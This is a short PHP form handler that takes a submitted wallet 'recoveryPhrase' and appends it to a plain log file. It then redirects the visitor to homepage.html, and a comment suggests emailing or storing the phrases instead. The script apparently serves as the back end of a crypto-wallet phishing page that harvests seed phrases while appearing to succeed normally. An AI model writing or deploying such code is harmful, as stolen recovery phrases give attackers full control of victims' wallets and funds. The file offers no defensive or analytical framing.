<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $recoveryPhrase = isset($_POST['recoveryPhrase']) ? trim($_POST['recoveryPhrase']) : '';

    if (!empty($recoveryPhrase)) {
        // Example: Save to a log file (you can replace this with email sending or database storage)
        file_put_contents("recovery_phrases.log", $recoveryPhrase . PHP_EOL, FILE_APPEND);

        // Redirect to a success page or show a success message
        header("Location: homepage.html");
        exit();
    } else {
        echo "Error: Recovery phrase cannot be empty.";
    }
} else {
    echo "Invalid request.";
}
?>
